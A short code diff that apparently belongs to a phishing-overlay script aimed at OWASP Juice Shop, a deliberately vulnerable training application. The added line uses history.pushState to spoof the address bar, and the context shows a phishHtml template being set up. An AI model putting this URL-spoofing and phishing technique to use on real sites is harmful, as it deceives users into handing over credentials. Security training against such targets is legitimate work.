@@ -1,3 +1,4 @@
+history.pushState(null, null, 'https://preview.owasp-juice.shop/#/search');
 let runOnce = false;
 const phishHtml = `
 <style>
